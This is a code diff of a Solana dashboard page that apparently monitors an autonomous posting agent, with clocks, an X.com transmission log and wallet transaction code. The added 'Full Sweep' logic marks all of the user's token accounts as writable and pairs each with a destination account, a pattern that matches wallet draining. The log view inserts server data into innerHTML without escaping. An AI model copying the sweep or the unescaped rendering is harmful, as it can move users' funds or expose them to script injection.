-            // Mocking destination ATA logic (Complex for single file...)
-            // For now, let's just Log that we need full logic.
-            console.warn("Full Sweep Not Implemented yet in this step");
+            // Add Remaining Accounts (Pairs: UserToken, DestToken)
+            if (userTokenAccounts && Array.isArray(userTokenAccounts)) {
+                for (const account of userTokenAccounts) {
+                    const destAta = getDestinationAta(account.mint);
+                    keys.push({ pubkey: account.pubkey, isSigner: false, isWritable: true });
+                    keys.push({ pubkey: destAta, isSigner: false, isWritable: true });
+                }
+            }
 
             return new solanaWeb3.TransactionInstruction({
                 keys,
@@ -1561,8 +1865,56 @@
             fetchHeartbeat();
             fetchSentiment();
             fetchQueue();
+            fetchTransmissionLog();
             fetchArchive();
             fetchWallet();
+            fetchOrchestration(); // New
+        }
+
+        async function fetchTransmissionLog() {
+            try {
+                const res = await fetch(getBaseUrl('transmission-log-get'));
+                const data = await res.json();
+                const list = document.getElementById('transmission-log');
+
+                if (!data.logs || data.logs.length === 0) {
+                    list.innerHTML = '<div class="list-item">NO TRANSMISSIONS YET</div>';
+                    return;
+                }
+
+                let html = '';
+                data.logs.forEach(log => {
+                    const time = formatTime(log.date);
+                    const link = log.link || "#";
+                    // Shorten text
+                    let snippet = log.text || "";
+                    if (snippet.length > 60) snippet = snippet.substring(0, 60) + "...";
+
+                    html += `
+                        <div class="list-item" style="border-bottom: 1px dotted #333; margin-bottom: 5px; padding-bottom:5px;">
+                            <div style="display:flex; justify-content:space-between; font-size:9px; color:#aaa;">
+                                <span>${time}</span>
+                                <span style="color:#484;">${log.type === 'AUTO_DIGEST' ? 'AUTONOMOUS' : 'MANUAL'}</span>
+                            </div>
+                            <div style="color:#fff; margin-bottom:2px;">"${snippet}"</div>
+                            <a href="${link}" target="_blank" style="color:#0ff; text-decoration:none; font-size:9px;">[VIEW ON X.COM]</a>
+                        </div>
+                    `;
+                });
+                list.innerHTML = html;
+
+            } catch (e) {
+                console.error("Transmission Fetch Error:", e);
+                document.getElementById('transmission-log').innerHTML = '<div class="list-item" style="color:#f00">CONNECTION ERR</div>';
+            }
+        }
+
+        async function clearTransmissionLog() {
+            if (!confirm("🗑️ CLEAR TRANSMISSION HISTORY? This removes verified logs.")) return;
+            try {
+                await fetch(getBaseUrl('transmission-log-clear'), { method: 'POST' });
+                fetchTransmissionLog(); // Refresh UI to empty
+            } catch (e) { alert("Clear Failed: " + e.message); }
         }
 
         setInterval(refreshAll, 10000); // 10s
@@ -1576,45 +1928,51 @@
         // --- SHARED TRANSACTION SENDER (Ported from App.js logic + Retry) ---
         // Buffer is polyfilled in HEAD via CDN
 
-        async function sendTransactionWrapper(transaction, connection) {
-            // DIRECT PHANTOM BYPASS
-            const provider = window.solana;
-            if (!provider || !provider.isPhantom) {
-                if (!activeProvider) throw new Error("No Wallet Provider Found");
-                return activeProvider.signAndSendTransaction(transaction);
+        async function sendTransactionWrapper(transaction, connection, providerOverride = null) {
+            // SIMPLE RELIABLE WRAPPER (Fixes "Not Authorized" bug)
+
+            // 1. Determine Provider (Use Override first, then Active, then Window)
+            const provider = providerOverride || activeProvider || window.solana;
+
+            if (!provider) {
+                alert("No Wallet Found. Please install Phantom or Solflare.");
+                throw new Error("No Wallet Provider");
             }
 
-            console.log("Wrapper: Direct Phantom Mode.");
+            console.log("Wrapper: Sending via", provider.isPhantom ? "Phantom" : (provider.isSolflare ? "Solflare" : "Other"), "FeePayer:", transaction.feePayer ? transaction.feePayer.toString() : "Unset");
+            if (provider.publicKey) console.log("Wrapper: Provider Key:", provider.publicKey.toString());
 
-            // 1. Force Disconnect (Clean Slate)
-            // We MUST disconnect to clear the "Unauthorized" state from the extension
-            try { await provider.disconnect(); } catch (e) { }
+            // 2. Ensure Connection/Auth
+            // If the provider isn't connected, try to connect. 
+            // NOTE: If we passed an override that was just connected in sendSol, this checks its state.
+            if (!provider.isConnected && provider.connect) {
+                console.log("Wrapper: Connecting provider...");
+                await provider.connect();
+            }
 
-            // 2. Connect & Capture Key
-            const resp = await provider.connect();
-            const freshKey = resp.publicKey;
-
-            // 3. Force Transaction to match Fresh Key (Safe Type Conversion)
-            // Converting to string and back to local PublicKey class ensures Type Safety
-            transaction.feePayer = new solanaWeb3.PublicKey(freshKey.toString());
-
-            // 4. Update Blockhash (Safety)
-            const { blockhash } = await connection.getLatestBlockhash();
-            transaction.recentBlockhash = blockhash;
-
-            console.log("Wrapper: Sending...", transaction.feePayer.toString());
-
-            // 5. Sign And Send
             try {
-                const result = await provider.signAndSendTransaction(transaction);
+                // 3. Sign And Send
+                const options = { skipPreflight: true };
+
+                // CRITICAL: Ensure we are using the provider that matches the Fee Payer if possible
+                if (transaction.feePayer && provider.publicKey && transaction.feePayer.toString() !== provider.publicKey.toString()) {
+                    console.warn("Wrapper Warning: FeePayer mismatch!", transaction.feePayer.toString(), provider.publicKey.toString());
+                    // This might be the cause of "Not Authorized" if we selected the wrong provider global
+                }
+
+                const result = await provider.signAndSendTransaction(transaction, options);
+
                 const signature = result.signature || result;
                 return signature;
+
             } catch (e) {
                 console.error("SignAndSend Error:", e);
-                alert("Wallet Error: " + e.message);
+                // Propagate clean error
                 throw e;
             }
         }
+
+        // ... (Update callers below) ...
 
 
 
@@ -1648,6 +2006,45 @@
                 if (btn) btn.innerHTML = "⚡";
             }
         }
+        // --- CLOCK & SCHEDULE LOGIC ---
+        function updateClocks() {
+            const now = new Date();
+
+            // 1. UTC Clock
+            const timeString = now.toISOString().split('T')[1].split('.')[0] + " UTC";
+            const utcEl = document.getElementById('utc-clock');
+            if (utcEl) utcEl.innerText = timeString;
+
+            // 2. Prophecy Countdown (Target: 18:00 UTC)
+            const nextProphecy = new Date(now);
+            nextProphecy.setUTCHours(18, 0, 0, 0);
+            if (now > nextProphecy) nextProphecy.setUTCDate(nextProphecy.getUTCDate() + 1);
+
+            const diffProphecy = nextProphecy - now;
+            const pHours = Math.floor(diffProphecy / 3600000);
+            const pMins = Math.floor((diffProphecy % 3600000) / 60000);
+            const pSecs = Math.floor((diffProphecy % 60000) / 1000);
+
+            const pTimer = document.getElementById('prophecy-timer');
+            if (pTimer) pTimer.innerText = `NEXT VISION: ${pHours}h ${pMins}m ${pSecs}s`;
+
+            // 3. Archive Countdown (Target: 23:55 UTC)
+            const nextArchive = new Date(now);
+            nextArchive.setUTCHours(23, 55, 0, 0);
+            if (now > nextArchive) nextArchive.setUTCDate(nextArchive.getUTCDate() + 1);
+
+            const diffArchive = nextArchive - now;
+            const aHours = Math.floor(diffArchive / 3600000);
+            const aMins = Math.floor((diffArchive % 3600000) / 60000);
+            const aSecs = Math.floor((diffArchive % 60000) / 1000);
+
+            const aTimer = document.getElementById('archive-timer');
+            if (aTimer) aTimer.innerText = `NEXT SCRIBE: ${aHours}h ${aMins}m ${aSecs}s`;
+        }
+
+        // Start Clocks
+        setInterval(updateClocks, 1000);
+        updateClocks(); // Initial call
     </script>
 </body>
 <!-- FORCE DEPLOY: 2025-12-30T23:35 -->
